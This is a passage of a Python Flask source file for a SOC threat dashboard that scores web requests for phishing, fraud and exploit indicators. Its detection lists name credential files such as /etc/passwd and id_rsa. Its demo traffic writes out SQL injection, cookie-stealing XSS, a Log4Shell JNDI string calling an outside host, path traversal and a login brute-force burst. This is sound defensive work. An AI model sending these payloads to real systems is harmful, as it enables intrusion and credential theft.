"""
SOC Threat Dashboard — v3
=========================
Fixes over v2
  • Detection accuracy: URL-decoding (single + double) before matching, so encoded
    SQLi / XSS / traversal payloads are caught; token-boundary matching removes false
    positives (".com" in any referrer, "payload" in normal JSON, "ssn" inside words…);
    noisy generic keywords pruned; regex signatures for SQLi / XSS / Log4Shell / SSTI.
  • Scoring: normalised 0–100 risk with five severity tiers; each category counted once
    per request (no double-counting across URL/body/referrer).
  • Security: all dashboard output HTML-escaped (v2 had stored XSS via paths, UAs and
    blocklist reasons); block/unblock/demo endpoints require an admin (localhost/private
    network, or X-SOC-Token when SOC_ADMIN_TOKEN is set); debug mode off by default.
  • Concurrency: rate limiter and blocklist protected by locks.
  • Alerts: stable dedup keys with a 5-minute window (v2 fired a new "auto-blocked"
    alert on every request); id-based polling (v2 offsets broke after 1,000 alerts).
  • Geo: private/reserved IPs never looked up or penalised; API errors are not scored.
  • Unblock now clears the IP's rate window (v2 re-blocked it on the next request).
  • Every unknown path (not just 5 routes) is analysed, so all honeypot paths work.
  • /api/threat-stats implemented (was documented in v2 but missing).

Run
  pip install flask requests
  python soc_dashboard_v3.py            # http://127.0.0.1:5000
  python soc_dashboard_v3.py --demo     # also streams synthetic attack traffic
Env
  SOC_ADMIN_TOKEN=…   require this token (header X-SOC-Token) for admin actions
  SOC_HOST / SOC_PORT bind address (default 127.0.0.1:5000)
"""

from __future__ import annotations

import argparse
import hmac
import ipaddress
import os
import re
import threading
import time
from collections import defaultdict, deque
from datetime import datetime, timezone
from urllib.parse import unquote, unquote_plus

import requests as _requests
from flask import Flask, Response, jsonify, request

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 64 * 1024  # reject huge bodies outright

# ══════════════════════════════════════════════════════════════════════════════
# THREAT INTELLIGENCE
# Sources: IC3 2024, KnowBe4 Phishing Trends 2025, GlobalAntiScamAlliance 2024,
#          Mastercard Cyber Survey 2025, FTC 2025 top complaints.
# Keywords are matched on token boundaries after URL-decoding and normalising
# separators (space, _, +, -) to "-", so "verify_account", "verify account" and
# "verify-account" are all equivalent.
# ══════════════════════════════════════════════════════════════════════════════

THREAT_INTEL: dict[str, dict] = {
    "phishing": {
        "label": "Phishing", "weight": 35,
        "keywords": [
            "verify-account", "confirm-identity", "update-billing", "account-suspended",
            "unusual-activity", "security-alert", "login-verify", "signin-confirm",
            "reactivate-account", "limited-access", "password-reset-required",
            "unlock-account", "validate-email", "verify-email-address", "confirm-email",
            "webscr", "ebayisapi", "paypal-secure", "secure-login", "banking-online",
            "online-banking-secure", "account-secure", "credential-harvest",
            "enter-password", "submit-login", "phishkit", "phish-page",
            "paypa1", "arnazon", "g00gle", "micros0ft", "app1e", "faceb00k", "netf1ix",
            "bankofamerica-secure", "qr-redirect", "scan-qr", "qrcode-login",
            "ai-verify", "deeplink-auth", "smart-verify",
        ],
    },
    "financial_fraud": {
        "label": "Financial fraud", "weight": 40,
        "keywords": [
            "wire-transfer", "urgent-transfer", "escrow-payment", "release-funds",
            "transfer-now", "send-money-now", "western-union", "moneygram",
            "bitcoin-transfer", "crypto-payment", "btc-wallet", "eth-wallet",
            "unclaimed-funds", "lottery-winner", "inheritance-claim", "prize-claim",
            "claim-reward", "free-gift-card", "advance-fee", "processing-fee-required",
            "release-fee", "guaranteed-returns", "risk-free-investment",
            "double-your-money", "crypto-profit", "forex-signals", "pump-and-dump",
            "pig-butchering", "romance-investment", "quantum-ai-invest",
            "celebrity-endorsement-crypto", "irs-refund", "tax-refund-pending",
            "gov-payment", "stimulus-check", "benefit-payment-pending",
            "social-security-suspended", "ssn-compromised", "debt-relief-now",
            "loan-forgiveness-apply", "credit-repair-instant",
        ],
    },
    "malware_delivery": {
        "label": "Malware delivery", "weight": 45,
        "keywords": [
            "dropper", "shellcode", "stager",
            ".exe", ".bat", ".ps1", ".vbs", ".jar", ".hta", ".scr", ".pif", ".cmd",
            "c2-server", "c2-panel", "command-control",
            "ransomware", "ransom-note", "decrypt-files", "your-files-encrypted",
            "pay-ransom", "cobalt-strike", "metasploit", "brute-ratel", "havoc-c2",
            "formjack", "card-skimmer", "magecart", "exploitkit", "rig-ek", "purple-fox",
        ],
    },
    "social_engineering": {
        "label": "Social engineering", "weight": 30,
        "keywords": [
            "act-now", "expires-today", "immediate-action-required",
            "respond-immediately", "your-account-will-be-closed", "final-warning",
            "ceo-request", "executive-request", "from-the-cfo",
            "microsoft-support", "apple-support", "google-support", "amazon-support",
            "tech-support-alert", "romance-scam", "dating-investment",
            "i-love-you-send", "soulmate-invest", "voice-clone", "deepfake-verify",
            "ai-call-verify", "virus-detected-call", "your-computer-infected",
            "windows-defender-alert", "call-immediately", "sim-swap", "carrier-transfer",
        ],
    },
    "reconnaissance": {
        "label": "Reconnaissance", "weight": 25,
        "keywords": [
            ".git/config", ".env", "config.php", "wp-config", "database.yml",
            ".htaccess", "web.config", "phpinfo", "server-status", "server-info",
            "/etc/passwd", "/etc/shadow", "shadow.bak", "credentials.xml",
            "secrets.json", "id_rsa", ".bak", ".old", ".backup", ".swp", ".orig",
            "xmlrpc.php", "wp-json/wp/v2/users",
        ],
        "patterns": [r"(?:\.\./|\.\.\\){2,}"],
    },
    "exploit": {
        "label": "Exploit attempt", "weight": 60,
        "keywords": [
            "union-select", "1=1-", "<script", "javascript:", "onmouseover=",
            "onerror=", "onload=", ";cat-/", ";id;", "|whoami", "`id`",
            "java.lang.runtime", "ysoserial", "${jndi:", "${${::-j}",
            "{{7*7}}", "${7*7}", "#{7*7}", "()-{-:;-};", "latest/meta-data",
        ],
        "patterns": [
            r"union-(?:all-)?select",
            r"'-?or-?'?\d+'?-?=-?'?\d+",
            r"\$\{(?:jndi|\$\{)",
            r"\{\{-?\d+\*\d+-?\}\}",
            r"(?:\.\./){4,}",
            r"%(?:25)+2e%(?:25)+2e",
            r"169\.254\.169\.254", r"metadata\.google\.internal", r"(?<![a-z])(?:file|gopher|dict)://",
        ],
    },
    "bot_automation": {
        "label": "Scanner / bot", "weight": 15,
        "ua_keywords": [
            "python-requests", "go-http-client", "java/", "curl/", "wget/",
            "libwww-perl", "scrapy", "httpie", "axios/", "node-fetch", "got/",
            "masscan", "zgrab", "nuclei", "sqlmap", "nikto", "dirbuster", "gobuster",
            "ffuf", "wfuzz", "hydra", "medusa", "nmap-scripting", "burpsuite", "zap/",
            "acunetix", "nessus", "openvas", "metasploit", "shodan",
            "headlesschrome", "phantomjs", "selenium", "puppeteer", "playwright",
        ],
    },
    "exfiltration": {
        "label": "Data exfiltration", "weight": 40,
        "keywords": [
            "exfil", "exfiltrate", "exfiltration", "extract-data", "download-all",
            "bulk-download", "mass-export", "harvest-data", "data-mine", "dump-db",
            "mysqldump", "pg_dump", "download-users", "export-emails",
            "export-passwords", "export-keys",
        ],
    },
    "identity_theft": {
        "label": "Identity theft", "weight": 35,
        "keywords": [
            "ssn", "social-security-number", "drivers-license", "passport-number",
            "credit-card-number", "cvv", "card-expiry", "bank-account-number",
            "routing-number", "mothers-maiden-name", "security-question",
            "identity-document", "pin-number", "otp-code", "one-time-passcode",
        ],
    },
    "honeypot": {
        "label": "Honeypot probe", "weight": 60,
        "paths": [
            "/admin", "/administrator", "/wp-admin", "/wp-login.php", "/xmlrpc.php",
            "/phpmyadmin", "/pma", "/myadmin", "/shell", "/webshell", "/.git",
            "/api/v1/internal", "/actuator", "/console", "/manager/html", "/cgi-bin/",
            "/.env", "/config", "/debug", "/test", "/backup",
        ],
    },
    "ransomware_extortion": {
        "label": "Ransomware / extortion", "weight": 55,
        "keywords": [
            "pay-bitcoin", "ransom-demand", "your-files-locked", "decrypt-tool",
            "payment-deadline", "negotiation-portal", "tor-onion-payment",
            "darkweb-payment", "i-have-your-data", "data-breach-threat",
            "publish-your-data", "sextortion", "explicit-images-threat", "pay-or-publish",
        ],
    },
    "emerging_2025": {
        "label": "Emerging 2025", "weight": 30,
        "keywords": [
            "fraudgpt", "wormgpt", "darkgpt", "ai-scam-kit", "llm-phish",
            "toll-payment-due", "package-held", "delivery-fee-pending",
            "usps-package-fee", "fedex-delivery-pending", "wrong-number-invest",
            "hello-friend-invest", "qr-payment", "scan-to-pay-qr", "qr-invoice",
            "deepfake-cfo", "video-call-verify-bank", "connect-wallet",
            "approve-contract", "wallet-drain", "nft-airdrop-claim", "crypto-airdrop-free",
        ],
    },
}

# Categories scanned in each part of the request
URL_CATEGORIES = [c for c in THREAT_INTEL if c not in ("honeypot", "bot_automation")]
BODY_CATEGORIES = URL_CATEGORIES
REFERRER_CATEGORIES = ["phishing", "financial_fraud", "malware_delivery", "exploit", "emerging_2025"]
UA_CATEGORIES = ["exploit"]  # Log4Shell / Shellshock payloads often ride in the UA
ALERT_CATEGORIES = {"phishing", "financial_fraud", "malware_delivery", "exploit",
                    "ransomware_extortion", "identity_theft", "exfiltration"}

# ── Matcher compilation ───────────────────────────────────────────────────────
_SEP_RE = re.compile(r"[\s_+\-]+")
_EXT_RE = re.compile(r"^\.[a-z0-9]{2,6}$")


def _normalize(text: str) -> str:
    return _SEP_RE.sub("-", text.lower())


def _compile_keyword(kw: str) -> re.Pattern:
    k = _normalize(kw)
    if _EXT_RE.match(k):  # file extension: must end a path segment
        return re.compile(re.escape(k) + r"(?=$|[?#/&;\s\"'\-])")
    prefix = r"(?<![a-z0-9])" if k[0].isalnum() else ""
    suffix = r"(?![a-z0-9])" if k[-1].isalnum() else ""
    return re.compile(prefix + re.escape(k) + suffix)


def _compile_honeypot(path: str) -> re.Pattern:
    p = path.lower()
    tail = "" if p.endswith("/") else r"(?=$|[/?#.])"
    return re.compile("^" + re.escape(p) + tail)


RULES: dict[str, list[tuple[str, re.Pattern]]] = {}
for _cat, _cfg in THREAT_INTEL.items():
    matchers = [(kw, _compile_keyword(kw)) for kw in _cfg.get("keywords", []) + _cfg.get("ua_keywords", [])]
    matchers += [(f"regex:{p}", re.compile(p)) for p in _cfg.get("patterns", [])]
    RULES[_cat] = matchers
HONEYPOT_RULES = [(p, _compile_honeypot(p)) for p in THREAT_INTEL["honeypot"]["paths"]]
RULE_COUNT = sum(len(v) for v in RULES.values()) + len(HONEYPOT_RULES)

# ── Config ────────────────────────────────────────────────────────────────────
RATE_WINDOW_SECONDS = 60
RATE_BURST_LIMIT = 10   # alert above this many requests per window
RATE_BLOCK_LIMIT = 30   # auto-block at this many requests per window
ALERT_DEDUP_SECONDS = 300
SEVERITY_TIERS = [(80, "critical"), (55, "high"), (30, "medium"), (10, "low"), (0, "info")]
ADMIN_TOKEN = os.environ.get("SOC_ADMIN_TOKEN", "")
ADMIN_NETS = [ipaddress.ip_network(n) for n in
              ("127.0.0.0/8", "::1/128", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "fc00::/7")]

TRUSTED_PROXIES = [ipaddress.ip_network(n) for n in
                   ("127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "::1/128")]

BASELINE_COUNTRIES = {
    "US", "GB", "CA", "AU", "NZ", "DE", "FR", "NL", "SE", "NO", "DK", "FI", "CH", "AT",
    "BE", "IE", "PL", "PT", "ES", "IT", "CZ", "SK", "HU", "RO", "JP", "KR", "SG", "IN",
    "PK", "IL", "BR", "ZA",
}
HOSTING_ORG_RE = re.compile(
    r"\b(hosting|datacenter|data center|colocation|vps|dedicated server|cloud|amazon|aws|"
    r"google cloud|microsoft|azure|digitalocean|linode|akamai|vultr|hetzner|ovh|fastly|"
    r"cloudflare|leaseweb|choopa|psychz|tzulo)\b", re.I)

# ── Shared state (all mutations under _lock) ──────────────────────────────────
_lock = threading.RLock()
logs: deque = deque(maxlen=2000)
alerts: deque = deque(maxlen=1000)
rate_windows: dict[str, deque] = defaultdict(deque)
BLOCKLIST: dict[str, dict] = {}
_alert_seen: dict[tuple, float] = {}
_seq = {"event": 0, "alert": 0}
_counters = {"events": 0, "alerts": 0}
START_TIME = time.time()


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def _next_id(kind: str) -> int:
    _seq[kind] += 1
    return _seq[kind]


def severity_for(risk: int) -> str:
    for threshold, name in SEVERITY_TIERS:
        if risk >= threshold:
            return name
    return "info"


# ══════════════════════════════════════════════════════════════════════════════
# GEO ENRICHMENT
# ══════════════════════════════════════════════════════════════════════════════
DEMO_GEO = {  # documentation-range IPs used only by the demo generator
    "203.0.113.10": ("Frankfurt", "Germany", "DE", 50.11, 8.68, "DEMO Hetzner Online"),
    "203.0.113.24": ("Moscow", "Russia", "RU", 55.75, 37.62, "DEMO Residential ISP"),
    "203.0.113.57": ("São Paulo", "Brazil", "BR", -23.55, -46.63, "DEMO Telecom"),
    "198.51.100.4": ("Lagos", "Nigeria", "NG", 6.52, 3.38, "DEMO Mobile Network"),
    "198.51.100.33": ("Shenzhen", "China", "CN", 22.54, 114.06, "DEMO Cloud Hosting"),
    "198.51.100.71": ("Ashburn", "United States", "US", 39.04, -77.49, "DEMO Amazon AWS"),
    "192.0.2.15": ("Bucharest", "Romania", "RO", 44.43, 26.10, "DEMO VPS Provider"),
    "192.0.2.88": ("Chicago", "United States", "US", 41.88, -87.63, "DEMO Comcast Cable"),
    "192.0.2.140": ("Hanoi", "Vietnam", "VN", 21.03, 105.85, "DEMO Datacenter"),
    "192.0.2.201": ("London", "United Kingdom", "GB", 51.51, -0.13, "DEMO BT Broadband"),
}
_geo_cache: dict[str, tuple[float, dict]] = {}
_geo_lock = threading.Lock()


def _geo_record(ip, city, country, cc, lat, lon, org, source):
    risk = 0
    if cc and cc not in BASELINE_COUNTRIES and cc != "LAN":
        risk += 15
    if org and HOSTING_ORG_RE.search(org):
        risk += 10
    return {"ip": ip, "city": city, "country": country, "cc": cc, "lat": lat,
            "lon": lon, "org": org, "geo_risk": risk, "geo_source": source}


def enrich_ip(ip: str) -> dict:
    if ip in DEMO_GEO:
        return _geo_record(ip, *DEMO_GEO[ip], source="demo")
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return _geo_record(ip, "Unknown", "", "", None, None, "", "invalid")
    if not addr.is_global:
        return _geo_record(ip, "Local network", "Private", "LAN", None, None, "Private / reserved", "local")

    now = time.time()
    with _geo_lock:
        hit = _geo_cache.get(ip)
        if hit and hit[0] > now:
            return dict(hit[1])
    try:
        data = _requests.get(f"https://ipapi.co/{ip}/json/", timeout=2.5,
                             headers={"User-Agent": "soc-dashboard/3"}).json()
        if data.get("error"):
            raise ValueError(data.get("reason", "lookup error"))
        rec = _geo_record(ip, data.get("city") or "Unknown", data.get("country_name") or "",
                          data.get("country_code") or "", data.get("latitude"),
                          data.get("longitude"), data.get("org") or "", "ipapi")
        ttl = 3600
    except Exception:
        # Lookup failure is not evidence of risk: score 0, retry in 5 minutes
        rec = _geo_record(ip, "Unknown", "", "", None, None, "", "unavailable")
        ttl = 300
    with _geo_lock:
        if len(_geo_cache) > 5000:
            _geo_cache.clear()
        _geo_cache[ip] = (now + ttl, rec)
    return dict(rec)


# ══════════════════════════════════════════════════════════════════════════════
# ANALYSIS
# ══════════════════════════════════════════════════════════════════════════════
def _decoded_variants(raw: str) -> str:
    """Raw text plus up to two rounds of URL-decoding, normalised."""
    if not raw:
        return ""
    parts, cur = [raw], raw
    for _ in range(2):
        nxt = unquote_plus(cur)
        if nxt == cur:
            break
        parts.append(nxt)
        cur = nxt
    return _normalize("\n".join(parts))


def _match(text: str, category: str) -> list[str]:
    return [label for label, rx in RULES[category] if rx.search(text)] if text else []


def _get_real_ip() -> str:
    remote = request.remote_addr or "0.0.0.0"
    try:
        trusted = any(ipaddress.ip_address(remote) in n for n in TRUSTED_PROXIES)
    except ValueError:
        trusted = False
    if trusted:
        xff = request.headers.get("X-Forwarded-For", "")
        candidate = xff.split(",")[0].strip() if xff else remote
        try:
            ipaddress.ip_address(candidate)
            return candidate
        except ValueError:
            pass
    return remote


def analyze_request(path: str, query: str, ua: str, method: str, referrer: str, body: str) -> dict:
    findings: dict[str, set] = defaultdict(set)
    hit_list: list[dict] = []
    misc_tags: list[str] = []
    misc_risk = 0

    def add(cat, labels, source):
        for lbl in labels:
            if lbl not in findings[cat]:
                hit_list.append({"category": cat, "keyword": lbl, "source": source,
                                 "weight": THREAT_INTEL[cat]["weight"]})
            findings[cat].add(lbl)

    path_l = unquote(path).lower()
    for label, rx in HONEYPOT_RULES:
        if rx.search(path_l):
            add("honeypot", [label], "path")
            break

    url_text = _decoded_variants(path + ("?" + query if query else ""))
    for cat in URL_CATEGORIES:
        add(cat, _match(url_text, cat), "url")

    ua_norm = _normalize(ua)
    add("bot_automation", _match(ua_norm, "bot_automation"), "user-agent")
    for cat in UA_CATEGORIES:
        add(cat, _match(_decoded_variants(ua), cat), "user-agent")
    if not ua.strip() or ua.strip() == "-":
        misc_tags.append("MISSING_UA")
        misc_risk += 10

    if method in ("TRACE", "TRACK", "DEBUG", "CONNECT"):
        misc_tags.append("SUSPICIOUS_METHOD")
        misc_risk += 15

    if body:
        body_text = _decoded_variants(body)
        for cat in BODY_CATEGORIES:
            add(cat, _match(body_text, cat), "body")

    if referrer:
        ref_text = _decoded_variants(referrer)
        for cat in REFERRER_CATEGORIES:
            add(cat, _match(ref_text, cat), "referrer")

    risk = sum(THREAT_INTEL[c]["weight"] for c in findings) + misc_risk
    return {
        "categories": sorted(findings),
        "threat_tags": [c.upper() for c in sorted(findings)] + misc_tags,
        "keyword_hits": hit_list[:12],
        "findings": {c: sorted(v) for c, v in findings.items()},
        "risk": risk,
    }


def rate_check(ip: str) -> dict:
    """Sliding-window limiter; promotes to the blocklist at RATE_BLOCK_LIMIT."""
    now = time.time()
    with _lock:
        window = rate_windows[ip]
        while window and window[0] < now - RATE_WINDOW_SECONDS:
            window.popleft()
        window.append(now)
        count = len(window)
        just_blocked = False
        if count >= RATE_BLOCK_LIMIT and ip not in BLOCKLIST:
            BLOCKLIST[ip] = {"reason": f"Auto-blocked: {count} requests in {RATE_WINDOW_SECONDS}s",
                             "time": _now_iso(), "source": "rate_limiter"}
            just_blocked = True
        if len(rate_windows) > 10000:  # drop idle IPs
            for k in [k for k, w in rate_windows.items() if not w or w[-1] < now - RATE_WINDOW_SECONDS]:
                del rate_windows[k]
    return {"count": count, "exceeded": count > RATE_BURST_LIMIT, "just_blocked": just_blocked}


def emit_alert(ip: str, key: str, reason: str, severity: str, category: str, risk: int):
    now = time.time()
    with _lock:
        last = _alert_seen.get((ip, key))
        if last and now - last < ALERT_DEDUP_SECONDS:
            return
        _alert_seen[(ip, key)] = now
        if len(_alert_seen) > 20000:
            for k in [k for k, t in _alert_seen.items() if now - t > ALERT_DEDUP_SECONDS]:
                del _alert_seen[k]
        _counters["alerts"] += 1
        alerts.append({"id": _next_id("alert"), "ip": ip, "reason": reason[:240],
                       "severity": severity, "category": category, "risk": risk,
                       "time": _now_iso(), "ts": now})


def _ingest() -> dict:
    ip = _get_real_ip()
    path = request.path
    query = request.query_string.decode("latin-1", "replace")
    ua = request.headers.get("User-Agent", "")[:512]
    referrer = (request.referrer or "")[:1024]
    method = request.method
    body = ""
    length = request.content_length or 0
    oversized = length > app.config["MAX_CONTENT_LENGTH"]
    if method in ("POST", "PUT", "PATCH", "DELETE") and length and not oversized:
        body = request.get_data(as_text=True)[:16384]  # padding a payload past 8 KB no longer hides it

    rate = rate_check(ip)
    with _lock:
        blocked = ip in BLOCKLIST
    analysis = analyze_request(path, query, ua, method, referrer, body)
    geo = enrich_ip(ip)

    tags = list(analysis["threat_tags"])
    risk = analysis["risk"] + geo["geo_risk"]
    if rate["exceeded"]:
        tags.append("RATE_EXCEEDED")
        risk += 15
    if oversized:
        tags.append("OVERSIZED_BODY")
        risk += 10
    if blocked:
        tags.append("BLOCKED")
        risk = 100
    risk = min(int(risk), 100)
    sev = severity_for(risk)

    entry = {
        "time": _now_iso(), "ts": time.time(), "method": method,
        "path": path[:300], "query": query[:500], "ua": ua[:200], "referrer": referrer[:300],
        "categories": analysis["categories"], "threat_tags": tags,
        "keyword_hits": analysis["keyword_hits"], "rate_count": rate["count"],
        "blocked": blocked, "oversized": oversized, "risk": risk, "severity": sev, **geo,
    }
    with _lock:
        entry["id"] = _next_id("event")
        _counters["events"] += 1
        logs.append(entry)

    # ── alerts (stable keys → one alert per IP per issue per 5 min) ──
    short = (path + ("?" + query if query else ""))[:90]
    if rate["just_blocked"]:
        emit_alert(ip, "auto_block", f"Auto-blocked after {rate['count']} requests in {RATE_WINDOW_SECONDS}s",
                   "critical", "RATE_LIMIT", 100)
    elif blocked:
        emit_alert(ip, "blocked", "Traffic from blocklisted IP (403)", "high", "BLOCKED", 100)
    elif rate["exceeded"]:
        emit_alert(ip, "rate", f"Request burst: {rate['count']} in {RATE_WINDOW_SECONDS}s", "medium", "RATE_LIMIT", risk)
    if "honeypot" in analysis["findings"]:
        emit_alert(ip, "honeypot", f"Honeypot probe: {short}", sev, "HONEYPOT", risk)
    if "bot_automation" in analysis["findings"]:
        emit_alert(ip, "bot", f"Scanner / automation UA: {ua[:70]}", sev, "BOT_AUTOMATION", risk)
    for cat in analysis["categories"]:
        if cat in ALERT_CATEGORIES:
            hits = ", ".join(h.replace("regex:", "pattern ") for h in analysis["findings"][cat][:3])
            emit_alert(ip, f"cat:{cat}", f"{THREAT_INTEL[cat]['label']}: {hits}", sev, cat.upper(), risk)
    if risk >= 80 and not blocked:
        emit_alert(ip, "critical", f"Critical risk {risk}/100 on {short}", "critical", "HIGH_RISK", risk)
    return entry


# ══════════════════════════════════════════════════════════════════════════════
# ROUTES
# ══════════════════════════════════════════════════════════════════════════════
def _is_admin() -> bool:
    if ADMIN_TOKEN:
        return hmac.compare_digest(request.headers.get("X-SOC-Token", ""), ADMIN_TOKEN)
    try:
        addr = ipaddress.ip_address(request.remote_addr or "")
    except ValueError:
        return False
    # Not addr.is_private: in Python that also covers link-local, documentation and benchmark ranges.
    return any(addr in net for net in ADMIN_NETS)


def _admin_required():
    if _is_admin():
        return None
    return jsonify({"error": "Admin access required (set X-SOC-Token)"}), (401 if ADMIN_TOKEN else 403)


@app.route("/log", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "TRACE"])
def log_ip():
    entry = _ingest()
    if entry["blocked"]:
        return jsonify({"status": "blocked"}), 403
    if entry["oversized"]:
        return jsonify({"status": "rejected", "error": "Request body too large"}), 413
    return jsonify({"status": "ok", "ip": entry["ip"], "risk": entry["risk"],
                    "severity": entry["severity"], "threat_tags": entry["threat_tags"]})


@app.errorhandler(404)
def catch_all(_err):
    """Every unknown path is analysed — this is how honeypot probes are caught."""
    if request.path == "/favicon.ico":
        return Response(status=204)
    entry = _ingest()
    return Response("Forbidden" if entry["blocked"] else "Not Found",
                    status=403 if entry["blocked"] else 404, mimetype="text/plain")


@app.route("/api/health")
def health():
    return jsonify({"status": "ok", "uptime_s": int(time.time() - START_TIME), "rules": RULE_COUNT})


@app.route("/api/logs")
def get_logs():
    after = request.args.get("after_id", type=int, default=0)
    limit = max(1, min(request.args.get("limit", type=int, default=200), 500))
    with _lock:
        snap = [e for e in logs if e["id"] > after]
    return jsonify(snap[-limit:])


@app.route("/api/alerts")
def get_alerts():
    after = request.args.get("after_id", type=int, default=0)
    limit = max(1, min(request.args.get("limit", type=int, default=200), 500))
    with _lock:
        snap = [a for a in alerts if a["id"] > after]
    return jsonify(snap[-limit:])


def _category_breakdown(snap):
    cats = defaultdict(int)
    for e in snap:
        for c in e.get("categories", []):
            cats[c] += 1
    return dict(sorted(cats.items(), key=lambda kv: -kv[1]))


@app.route("/api/stats")
def get_stats():
    with _lock:
        snap = list(logs)
        n_block = len(BLOCKLIST)
        blocked_ips = set(BLOCKLIST)
    sev = {name: 0 for _, name in SEVERITY_TIERS}
    sources: dict[str, dict] = {}
    for e in snap:
        sev[e["severity"]] += 1
        s = sources.setdefault(e["ip"], {"ip": e["ip"], "count": 0, "max_risk": 0,
                                         "cc": e.get("cc", ""), "city": e.get("city", ""),
                                         "last_seen": e["time"]})
        s["count"] += 1
        s["max_risk"] = max(s["max_risk"], e["risk"])
        s["last_seen"] = e["time"]
    top = sorted(sources.values(), key=lambda s: (-s["max_risk"], -s["count"]))[:8]
    for s in top:
        s["blocked"] = s["ip"] in blocked_ips
        s["severity"] = severity_for(s["max_risk"])
    return jsonify({
        "total": _counters["events"], "window": len(snap), "unique_ips": len(sources),
        "severity": sev, "alerts": _counters["alerts"], "blocklist": n_block,
        "categories": _category_breakdown(snap),
        "labels": {k: v["label"] for k, v in THREAT_INTEL.items()},
        "top_sources": top, "rules": RULE_COUNT, "uptime_s": int(time.time() - START_TIME),
    })


@app.route("/api/threat-stats")
def threat_stats():
    with _lock:
        snap = list(logs)
    by_source = defaultdict(int)
    for e in snap:
        for h in e.get("keyword_hits", []):
            by_source[h["source"]] += 1
    sev = defaultdict(int)
    for e in snap:
        sev[e["severity"]] += 1
    return jsonify({"categories": _category_breakdown(snap), "severity": dict(sev),
                    "hits_by_source": dict(by_source)})


@app.route("/api/blocklist")
def get_blocklist():
    with _lock:
        return jsonify(dict(BLOCKLIST))


@app.route("/api/block", methods=["POST"])
def block_ip():
    denied = _admin_required()
    if denied:
        return denied
    data = request.get_json(silent=True) or {}
    ip_str = str(data.get("ip", "")).strip()
    reason = str(data.get("reason") or "Manual block")[:200]
    try:
        ipaddress.ip_address(ip_str)
    except ValueError:
        return jsonify({"error": "Invalid IP address"}), 400
    with _lock:
        BLOCKLIST[ip_str] = {"reason": reason, "time": _now_iso(), "source": "manual"}
    emit_alert(ip_str, f"manual_block:{time.time()}", f"Manually blocked: {reason}", "high", "BLOCKED", 100)
    return jsonify({"status": "blocked", "ip": ip_str})


@app.route("/api/unblock", methods=["POST"])
def unblock_ip():
    denied = _admin_required()
    if denied:
        return denied
    ip_str = str((request.get_json(silent=True) or {}).get("ip", "")).strip()
    with _lock:
        removed = BLOCKLIST.pop(ip_str, None)
        rate_windows.pop(ip_str, None)  # otherwise the next request re-blocks it
        for k in [k for k in _alert_seen if k[0] == ip_str]:
            del _alert_seen[k]
    if removed:
        return jsonify({"status": "unblocked", "ip": ip_str})
    return jsonify({"error": "IP not in blocklist"}), 404


# ── Demo traffic ──────────────────────────────────────────────────────────────
CHROME = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36"
DEMO_EVENTS = [
    ("192.0.2.88", "GET", "/log?page=/pricing", CHROME, None, "https://www.google.com/search?q=soc"),
    ("192.0.2.201", "GET", "/log?page=/blog/zero-trust", CHROME, None, None),
    ("203.0.113.10", "GET", "/wp-login.php", "Mozilla/5.0 (compatible; Nuclei - Open-source project)", None, None),
    ("203.0.113.10", "GET", "/.env", "Nuclei - Open-source project", None, None),
    ("198.51.100.33", "GET", "/log?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--", "sqlmap/1.8.4#stable (https://sqlmap.org)", None, None),
    ("198.51.100.33", "GET", "/log?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E", "sqlmap/1.8.4", None, None),
    ("203.0.113.24", "GET", "/log?next=/account-suspended/verify-account&brand=paypa1", CHROME, None, None),
    ("198.51.100.4", "POST", "/log", CHROME, "subject=Inheritance claim&body=Release funds via Western Union, processing fee required", None),
    ("198.51.100.71", "GET", "/log", "${jndi:ldap://203.0.113.5:1389/a}", None, None),
    ("192.0.2.140", "GET", "/log?file=../../../../etc/passwd", "python-requests/2.32.3", None, None),
    ("203.0.113.57", "POST", "/log", CHROME, "card=credit card number&cvv=123&ssn=000-00-0000", None),
    ("192.0.2.15", "GET", "/phpmyadmin/index.php", "Mozilla/5.0 zgrab/0.x", None, None),
    ("192.0.2.15", "GET", "/log?download=invoice.pdf.exe", CHROME, None, None),
    ("198.51.100.4", "GET", "/log?promo=nft-airdrop-claim&action=connect-wallet", CHROME, None, None),
    ("192.0.2.88", "GET", "/log?page=/docs/api", CHROME, None, "https://github.com/"),
]
_demo_running = threading.Event()


def _run_demo():
    try:
        client = app.test_client()
        for ip, method, path, ua, body, ref in DEMO_EVENTS:
            headers = {"User-Agent": ua}
            if ref:
                headers["Referer"] = ref
            client.open(path, method=method, headers=headers, data=body,
                        content_type="application/x-www-form-urlencoded" if body else None,
                        environ_base={"REMOTE_ADDR": ip})
            time.sleep(0.6)
        for _ in range(RATE_BLOCK_LIMIT + 3):  # brute-force burst → auto-block
            client.post("/wp-login.php", data="log=admin&pwd=123456",
                        content_type="application/x-www-form-urlencoded",
                        headers={"User-Agent": "Hydra v9.5"}, environ_base={"REMOTE_ADDR": "203.0.113.24"})
            time.sleep(0.05)
    finally:
        _demo_running.clear()


def start_demo() -> bool:
    if _demo_running.is_set():
        return False
    _demo_running.set()
    threading.Thread(target=_run_demo, daemon=True).start()
    return True


@app.route("/api/demo", methods=["POST"])
def demo():
    denied = _admin_required()
    if denied:
        return denied
    if not start_demo():
        return jsonify({"status": "already running"}), 409
    return jsonify({"status": "started", "events": len(DEMO_EVENTS) + RATE_BLOCK_LIMIT + 3})


@app.route("/")
def dashboard():
    return Response(DASHBOARD_HTML, mimetype="text/html")


# ══════════════════════════════════════════════════════════════════════════════
# DASHBOARD
# ══════════════════════════════════════════════════════════════════════════════
DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>SOC Threat Watch</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<style>
:root{
